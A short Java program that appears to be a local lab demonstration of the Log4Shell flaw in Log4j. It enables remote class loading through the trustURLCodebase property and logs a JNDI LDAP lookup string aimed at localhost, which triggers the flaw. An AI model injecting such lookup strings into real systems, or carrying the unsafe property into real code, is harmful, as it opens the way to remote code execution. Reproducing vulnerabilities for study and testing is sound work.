package com.kelseymckenna.ldap;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class DoJndiLookup {
    private static final Logger LOGGER = LogManager.getLogger();

    public static void main(String[] args) throws Exception {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        LOGGER.info("Starting");
        LOGGER.info("${jndi:ldap://localhost/cn=log4shell,dc=example,dc=com}");
        LOGGER.info("Finished");
    }
}
